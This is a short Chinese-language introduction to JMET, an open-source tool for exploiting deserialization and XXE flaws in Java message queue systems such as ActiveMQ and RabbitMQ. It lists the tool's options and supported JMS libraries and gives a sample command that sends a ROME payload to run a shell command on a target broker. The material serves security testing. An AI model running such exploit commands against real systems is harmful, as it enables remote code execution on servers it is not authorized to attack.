### 介绍

JMET（Java Message Exploitation Tool）是一个开源的安全测试工具，专为利用基于Java的消息队列系统（如ActiveMQ，RabbitMQ等）的漏洞而设计。

它主要通过发送精心构造的反序列化负载来执行任意命令



### 主要功能

- 反序列化利用（-Y）：结合ysoserial生成负载（如ROME，CommonsCollections等）
- XXE利用（-X）：利用XML外部实体注入漏洞
- 自定义脚本（-C）：运行用户提供的攻击脚本
- 支持多种消息队列：包括ActiveMQ，RabbitMQ，WebSphereMQ等



### 支持的JMS客户端库

- Apache ActiveMQ
- Redhat/Apache HornetQ
- Oracle OpenMQ
- IBM WebSphereMQ
- Oracle Weblogic
- Pivotal RabbitMQ
- IBM MessageSight
- IIT Software SwiftMQ
- Apache ActiveMQ Artemis
- Apache QPID JMS
- Apache QPID Client
- Amazon SQS Java Messaging



### 项目地址

[matthiaskaiser/jmet：Java 消息利用工具](https://github.com/matthiaskaiser/jmet)



### 简单使用

JMET的命令行格式通常为

```
java -jar jmet-0.1.0-all.jar [选项] [目标ip] [端口]
```



```
java -jar jmet-0.1.0-all.jar -Q test -I ActiveMQ -s -Y "touch /tmp/test" -Yp ROME 192.168.1.15 61616
```

- -Q test：指定队列名为test
- -I ActiveMQ：目标是ActiveMQ
- -s：启动替代模式
- -Y "touch /tmp/test"：执行命令touch /tmp/test
- -Yp ROME：使用ROME负载
- ip和端口



